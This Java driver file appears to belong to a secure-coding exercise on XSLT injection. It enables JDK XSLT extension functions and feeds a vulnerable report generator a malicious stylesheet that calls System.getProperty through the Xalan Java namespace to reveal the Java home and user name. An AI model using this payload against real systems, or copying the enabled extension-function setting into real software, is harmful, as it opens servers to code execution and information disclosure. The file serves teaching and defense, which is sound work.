/**
 * Driver for Exercise 3-8: The XSLT Trap.
 * Demonstrates the vulnerability in the default ReportGenerator.
 */
public class ReportApp {
    public static void main(String[] args) {
        // For demonstration purposes on modern JDKs where this might be disabled by
        // default:
        System.setProperty("jdk.xml.enableExtensionFunctions", "true");

        ReportGenerator vulnerableGenerator = new ReportGenerator();

        String xmlData = "<report><data>Financial results 2025</data></report>";

        // Malicious XSLT payload that attempts to call Java methods.
        // It tries to call System.getProperty() to prove it can access system
        // information.
        String maliciousXslt = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<xsl:stylesheet version=\"1.0\" \n" +
                "    xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
                "    xmlns:sys=\"http://xml.apache.org/xalan/java/java.lang.System\">\n" +
                "  <xsl:template match=\"/\">\n" +
                "    !!! EXPLOIT SUCCESSFUL !!!\n" +
                "    The XSLT engine interpreted malicious code and accessed system info:\n" +
                "    Java Home: <xsl:value-of select=\"sys:getProperty('java.home')\"/>\n" +
                "    User Name: <xsl:value-of select=\"sys:getProperty('user.name')\"/>\n" +
                "  </xsl:template>\n" +
                "</xsl:stylesheet>";

        System.out.println("[SYSTEM] Processing report with user-contributed stylesheet...");
        String result = vulnerableGenerator.generateReport(xmlData, maliciousXslt);

        System.out.println("\n[Result] Report content:\n" + result);
    }
}
